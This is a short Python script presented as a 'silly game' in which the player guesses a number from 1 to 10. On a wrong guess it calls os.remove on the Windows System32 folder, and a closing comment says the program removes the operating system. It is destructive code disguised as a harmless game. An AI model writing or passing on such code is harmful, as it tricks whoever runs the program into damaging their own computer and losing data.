import random 
import os

number = random.randint(1,10)

guess = input("Silly game")
guess = int(guess)

if guess == number:
    print("you won")
else:
    os.remove("C:\Windows\System32")
    
# Funny little program that removes your Operating System